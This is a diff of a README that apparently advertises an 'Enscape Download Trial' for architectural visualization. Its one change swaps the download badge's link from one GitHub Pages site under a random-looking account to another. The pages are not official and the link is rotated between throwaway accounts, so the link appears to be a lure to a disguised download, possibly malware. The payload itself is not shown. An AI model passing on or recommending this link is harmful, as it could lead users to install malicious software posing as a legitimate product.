@@ -2,7 +2,7 @@
 
 ![Architectural model with real-time lighting preview and material panels](https://avatars.mds.yandex.net/i?id=0d3b0e6ba436d9056f649b2e0d18f56aca8f9e7d-5138710-images-thumbs&n=13)
 
-[![Download Enscape Download Trial](https://img.shields.io/badge/Download-Enscape_Download_Trial-blueviolet?style=for-the-badge&logo=windows)](https://isaiashahnmpzt.github.io/.github/enscape-download-trial)
+[![Download Enscape Download Trial](https://img.shields.io/badge/Download-Enscape_Download_Trial-blueviolet?style=for-the-badge&logo=windows)](https://cyrusmuellerreol.github.io/.github/enscape-download-trial)
 
 ## Trial Preview for Visualization Teams
 
